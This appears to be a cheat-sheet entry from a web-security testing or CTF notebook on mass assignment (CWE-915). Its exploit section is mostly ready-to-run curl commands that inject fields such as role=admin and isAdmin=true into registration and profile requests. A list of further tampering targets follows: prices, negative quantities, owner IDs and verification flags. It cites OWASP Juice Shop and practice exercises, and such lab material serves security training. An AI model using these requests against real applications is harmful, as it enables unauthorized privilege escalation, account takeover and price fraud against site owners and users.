# Mass assignment / parameter tampering (CWE-915)

**Signs**: registration/profile/update endpoints taking JSON or forms; responses show fields you
didn't send (`role`, `isAdmin`, `credits`, `owner_id`, `verified`).

## Exploit
Add the privileged field to the request the app already makes:
```bash
curl -s -X POST $T/api/register -H 'Content-Type: application/json' \
     -d '{"username":"me","password":"x","role":"admin","isAdmin":true,"admin":1}'
curl -s -X PATCH $T/api/users/me -H 'Content-Type: application/json' -b j -d '{"role":"admin"}'
curl -s -b j -d 'name=me&role=admin&is_admin=1' $T/profile
```
Then re-login (role may be cached in session) and check the admin view.

Other tampering targets: `price`, `quantity=-1`, `discount`, `user_id`/`owner` (act on others),
`status=approved`, `email_verified=true`.

Seen in: Juice Shop (register as admin via `"role":"admin"`), many "business logic" exercises.
